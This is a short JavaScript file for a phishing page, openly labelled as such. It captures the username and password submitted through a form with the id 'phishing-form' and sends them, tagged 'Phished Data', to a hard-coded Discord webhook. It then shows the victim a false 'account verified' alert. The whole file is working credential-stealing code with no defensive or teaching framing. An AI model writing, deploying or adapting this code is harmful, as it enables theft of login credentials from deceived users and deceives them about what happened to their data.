document.getElementById('phishing-form').addEventListener('submit', function(event) {
    event.preventDefault();

    // Capture user input
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Discord webhook URL (replace with your actual webhook URL)
    const webhookURL = 'https://discordapp.com/api/webhooks/1240009256682393631/o5DZ28272oIto_8ef62DGcpu_csod04rZDpY154vb6_G02zk-NsnkDLU4d4PxHQoQI4V';

    // Payload for Discord webhook
    const payload = {
        content: `Phished Data:\nUsername: ${username}\nPassword: ${password}`
    };

    // Send data to Discord webhook
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Data sent to Discord:', data);
        alert('Your account has been verified. Thank you!');
    })
    .catch(error => console.error('Error:', error));
});
